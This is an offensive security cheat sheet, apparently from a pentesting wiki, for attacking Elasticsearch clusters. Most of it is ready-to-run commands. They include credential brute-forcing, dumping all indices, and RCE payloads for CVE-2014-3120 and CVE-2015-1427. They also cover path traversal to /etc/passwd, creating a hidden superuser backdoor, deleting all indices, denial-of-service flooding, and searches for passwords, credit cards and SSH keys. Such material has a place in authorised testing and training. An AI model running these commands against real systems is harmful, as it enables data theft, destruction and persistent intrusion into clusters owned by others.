# Elasticsearch

**`Default Ports: 9200 (HTTP), 9300 (Transport)`**

**Elasticsearch** is a distributed, RESTful search and analytics engine built on Apache Lucene. It's designed for horizontal scalability, real-time search, and complex data analysis. Elasticsearch stores data in JSON format and provides powerful full-text search capabilities. It's commonly used for log analytics (ELK stack), application search, security analytics, and business intelligence. Due to its RESTful API and potential misconfigurations, Elasticsearch instances can expose sensitive data if not properly secured.

### Connect <a href="#connect" id="connect"></a>

#### Using cURL (HTTP API) <a href="#using-curl-http-api" id="using-curl-http-api"></a>

Connect to Elasticsearch using the REST API with various authentication methods.

**Connect with Authentication**

```
curl -u username:password http://target.com:9200
```

**Connect with API Key**

```
curl -H "Authorization: ApiKey base64(id:api_key)" http://target.com:9200
```

#### Using Kibana (GUI) <a href="#using-kibana-gui" id="using-kibana-gui"></a>

```
URL: http://target.com:5601
Username: elastic
Password: password
```

#### Connection URL Format <a href="#connection-url-format" id="connection-url-format"></a>

```
http://username:password@hostname:port
http://elastic:password@target.com:9200
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to identify Elasticsearch nodes and check if the REST API is exposed without authentication.

```
nmap -p 9200,9300 -sV target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Identify Elasticsearch version and gather initial information about the cluster.

**Using Netcat**

```
nc target.com 9200
```

**Using cURL for Information**

```
curl http://target.com:9200
```

**Extract Version and Cluster Details**

```
curl http://target.com:9200 | jq .version
curl http://target.com:9200 | jq .cluster_name
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Cluster Information <a href="#cluster-information" id="cluster-information"></a>

Elasticsearch cluster information reveals node configurations, health status, and cluster topology.

**Get Cluster Health and Stats**

```
curl http://target.com:9200/_cluster/health?pretty
curl http://target.com:9200/_cluster/stats?pretty
```

**Get Cluster Settings**

```
curl http://target.com:9200/_cluster/settings?pretty
```

**Get Node Information**

```
curl http://target.com:9200/_nodes?pretty
curl http://target.com:9200/_cat/nodes?v
curl http://target.com:9200/_nodes/stats?pretty
```

#### Index Enumeration <a href="#index-enumeration" id="index-enumeration"></a>

Indices contain the actual data and enumerating them reveals what information is stored in Elasticsearch.

**List All Indices**

```
curl http://target.com:9200/_cat/indices?v
curl http://target.com:9200/_aliases?pretty
```

**Get Index Details**

```
curl http://target.com:9200/index_name?pretty
curl http://target.com:9200/index_name/_settings?pretty
```

**Get Index Mappings and Statistics**

```
curl http://target.com:9200/index_name/_mapping?pretty
curl http://target.com:9200/index_name/_stats?pretty
```

#### Data Enumeration <a href="#data-enumeration" id="data-enumeration"></a>

Search and analyze data stored in Elasticsearch indices to identify sensitive information.

**Search All Indices**

```
curl http://target.com:9200/_search?pretty
```

**Search Specific Index**

```
curl http://target.com:9200/index_name/_search?pretty
```

**Get All Documents**

```
curl http://target.com:9200/index_name/_search?size=1000&pretty
```

**Advanced Search Queries**

```
# Match all query
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "query": {
    "match_all": {}
  }
}'

# Count documents
curl http://target.com:9200/index_name/_count?pretty
```

#### Template and Pipeline Enumeration <a href="#template-and-pipeline-enumeration" id="template-and-pipeline-enumeration"></a>

Discover index templates, ingest pipelines, and stored scripts that may contain sensitive configuration.

**List Index Templates**

```
curl http://target.com:9200/_cat/templates?v
curl http://target.com:9200/_template?pretty
```

**List Ingest Pipelines**

```
curl http://target.com:9200/_ingest/pipeline?pretty
```

**List Stored Scripts**

```
curl http://target.com:9200/_scripts?pretty
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### No Authentication <a href="#no-authentication" id="no-authentication"></a>

Elasticsearch instances without authentication allow unrestricted access to all data and cluster management functions.

**Test for Unauthenticated Access**

```
curl http://target.com:9200
```

**Access All Data**

```
curl http://target.com:9200/_search?pretty
curl http://target.com:9200/_cat/indices?v
```

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

Many Elasticsearch installations use weak default credentials that are easily guessable.

**Common Default Credentials**

```
# Common default credentials for Elastic Stack
elastic:changeme
elastic:elastic
admin:admin
kibana:kibana
```

**Test Default Credentials**

```
curl -u elastic:changeme http://target.com:9200
curl -u elastic:elastic http://target.com:9200
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute forcing Elasticsearch credentials when X-Pack security is enabled.

**Using Hydra**

```
hydra -l elastic -P /usr/share/wordlists/rockyou.txt target.com http-get /:9200
```

**Custom Script**

```
for pass in $(cat passwords.txt); do
  response=$(curl -s -u elastic:$pass http://target.com:9200)
  if [[ $response != *"unauthorized"* ]]; then
    echo "[+] Found: elastic:$pass"
    break
  fi
done
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive data from Elasticsearch indices for analysis or exfiltration.

**Dump All Indices**

```
for index in $(curl -s http://target.com:9200/_cat/indices | awk '{print $3}'); do
  echo "[*] Dumping index: $index"
  curl http://target.com:9200/$index/_search?size=10000&pretty > ${index}_dump.json
done
```

**Export Specific Index**

```
# Without authentication
elasticdump \
  --input=http://target.com:9200/index_name \
  --output=./index_data.json \
  --type=data

# With authentication
elasticdump \
  --input=http://elastic:password@target.com:9200/index_name \
  --output=./index_data.json \
  --type=data
```

#### Index Manipulation <a href="#index-manipulation" id="index-manipulation"></a>

Manipulate Elasticsearch indices to cause data loss or create backdoors.

**Create Malicious Index**

```
curl -X PUT http://target.com:9200/backdoor_index?pretty
```

**Delete Indices**

```
# Delete specific index
curl -X DELETE http://target.com:9200/index_name?pretty

# Delete all indices
curl -X DELETE http://target.com:9200/_all?pretty
```

**Modify Index Settings**

```
curl -X PUT http://target.com:9200/index_name/_settings?pretty -H 'Content-Type: application/json' -d'
{
  "index": {
    "number_of_replicas": 0
  }
}'
```

#### Script Execution (CVE-2014-3120 & CVE-2015-1427) <a href="#script-execution-cve-2014-3120--cve-2015-1427" id="script-execution-cve-2014-3120--cve-2015-1427"></a>

Exploit script injection vulnerabilities in older Elasticsearch versions to execute arbitrary code.

**MVEL Script Injection (CVE-2014-3120)**

```
curl -X POST http://target.com:9200/_search?pretty -d'
{
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      }
    }
  },
  "script_fields": {
    "command": {
      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
    }
  }
}'
```

**Groovy Script Injection (CVE-2015-1427)**

```
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "query": {
    "function_score": {
      "query": {"match_all": {}},
      "script_score": {
        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"
      }
    }
  }
}'
```

#### Path Traversal <a href="#path-traversal" id="path-traversal"></a>

Attempt to read sensitive files from the host system using path traversal vulnerabilities.

**Basic Path Traversal**

```
curl http://target.com:9200/_plugin/../../../../../../etc/passwd
```

**URL Encoded Path Traversal**

```
curl http://target.com:9200/_plugin/..%2f..%2f..%2fetc%2fpasswd
```

**Plugin-Specific Path Traversal**

```
curl http://target.com:9200/_plugin/head/../../../../../../etc/passwd
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Data Extraction <a href="#data-extraction" id="data-extraction"></a>

Extract and analyze sensitive data from Elasticsearch indices for further exploitation.

**Export All Data**

```
curl -X POST http://target.com:9200/_search?scroll=1m&pretty -H 'Content-Type: application/json' -d'
{
  "size": 1000,
  "query": {
    "match_all": {}
  }
}'
```

**Search for Sensitive Data**

```
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "query": {
    "multi_match": {
      "query": "password secret token key credential",
      "fields": ["*"]
    }
  }
}'
```

**Search for Credit Cards**

```
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "credit_card": "[0-9]{16}"
    }
  }
}'
```

#### Persistence <a href="#persistence" id="persistence"></a>

Establish persistent access to the compromised Elasticsearch cluster.

**Create Backdoor User**

```
curl -X POST http://target.com:9200/_security/user/backdoor?pretty -u elastic:password -H 'Content-Type: application/json' -d'
{
  "password": "BackdoorP@ss123!",
  "roles": ["superuser"],
  "full_name": "System Admin",
  "email": "admin@system.local"
}'
```

**Create Backdoor Index**

```
curl -X PUT http://target.com:9200/.backdoor_index?pretty -H 'Content-Type: application/json' -d'
{
  "settings": {
    "index": {
      "hidden": true
    }
  }
}'
```

#### Denial of Service <a href="#denial-of-service" id="denial-of-service"></a>

Cause service disruption by overwhelming Elasticsearch with resource-intensive operations.

**Delete All Indices**

```
curl -X DELETE http://target.com:9200/_all?pretty
```

**Create Resource-Intensive Queries**

```
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "size": 10000,
  "query": {
    "bool": {
      "should": [
        {"wildcard": {"field": "*"}},
        {"regexp": {"field": ".*"}}
      ]
    }
  }
}'
```

**Flood with Bulk Requests**

```
for i in {1..10000}; do
  curl -X POST http://target.com:9200/test/_bulk?pretty -H 'Content-Type: application/json' -d'
  {"index":{}}
  {"field":"'$(head -c 100000 /dev/urandom | base64)'"}
  ' &
done
```

#### Snapshot and Restore Abuse <a href="#snapshot-and-restore-abuse" id="snapshot-and-restore-abuse"></a>

Exploit Elasticsearch snapshot and restore functionality for data manipulation or persistence.

**List Snapshots**

```
curl http://target.com:9200/_snapshot?pretty
```

**Create Snapshot Repository**

```
curl -X PUT http://target.com:9200/_snapshot/backup_repo?pretty -H 'Content-Type: application/json' -d'
{
  "type": "fs",
  "settings": {
    "location": "/tmp/backup"
  }
}'
```

**Create and Restore Snapshots**

```
# Create snapshot
curl -X PUT http://target.com:9200/_snapshot/backup_repo/snapshot_1?wait_for_completion=true&pretty

# Restore from snapshot
curl -X POST http://target.com:9200/_snapshot/backup_repo/snapshot_1/_restore?pretty
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Use Elasticsearch data to discover credentials and connection strings for lateral movement.

**Extract Database Credentials**

```
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "should": [
        {"match": {"*": "jdbc:"}},
        {"match": {"*": "mysql://"}},
        {"match": {"*": "postgresql://"}},
        {"match": {"*": "mongodb://"}}
      ]
    }
  }
}'
```

**Find SSH Keys**

```
curl -X POST http://target.com:9200/_search?pretty -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "*": "BEGIN.*PRIVATE KEY"
    }
  }
}'
```

### Common Elasticsearch APIs <a href="#common-elasticsearch-apis" id="common-elasticsearch-apis"></a>

| Endpoint           | Description     | Example                                   |
| ------------------ | --------------- | ----------------------------------------- |
| `/`                | Cluster info    | `curl http://target:9200/`                |
| `/_cat/indices`    | List indices    | `curl http://target:9200/_cat/indices?v`  |
| `/_search`         | Search data     | `curl http://target:9200/_search?pretty`  |
| `/_cluster/health` | Cluster health  | `curl http://target:9200/_cluster/health` |
| `/_nodes`          | Node info       | `curl http://target:9200/_nodes`          |
| `/_cat/shards`     | Shard info      | `curl http://target:9200/_cat/shards?v`   |
| `/_template`       | Index templates | `curl http://target:9200/_template`       |
| `/_snapshot`       | Snapshots       | `curl http://target:9200/_snapshot`       |

### Search Query Examples <a href="#search-query-examples" id="search-query-examples"></a>

```
# Match all
curl -X POST http://target:9200/_search?pretty -H 'Content-Type: application/json' -d'
{"query": {"match_all": {}}}'

# Term query
curl -X POST http://target:9200/_search?pretty -H 'Content-Type: application/json' -d'
{"query": {"term": {"field": "value"}}}'

# Range query
curl -X POST http://target:9200/_search?pretty -H 'Content-Type: application/json' -d'
{"query": {"range": {"age": {"gte": 20, "lte": 30}}}}'

# Wildcard query
curl -X POST http://target:9200/_search?pretty -H 'Content-Type: application/json' -d'
{"query": {"wildcard": {"field": "*admin*"}}}'

# Aggregations
curl -X POST http://target:9200/_search?pretty -H 'Content-Type: application/json' -d'
{"aggs": {"group_by_field": {"terms": {"field": "category"}}}}'
```

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool               | Description            | Primary Use Case |
| ------------------ | ---------------------- | ---------------- |
| curl               | HTTP client            | API interaction  |
| elasticdump        | Data export tool       | Index backup     |
| Kibana             | Visualization platform | Data exploration |
| elasticsearch-dump | Backup utility         | Data extraction  |
| Burp Suite         | Web proxy              | API testing      |
| Postman            | API client             | Manual testing   |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No authentication enabled
* ❌ Default credentials
* ❌ Exposed to internet (0.0.0.0)
* ❌ Dynamic scripting enabled
* ❌ No SSL/TLS encryption
* ❌ Weak passwords
* ❌ No network firewall
* ❌ Anonymous access allowed
* ❌ Verbose error messages
* ❌ No access logging
* ❌ Outdated Elasticsearch version
* ❌ Unnecessary APIs exposed
* ❌ Default port (9200) accessible

<br>
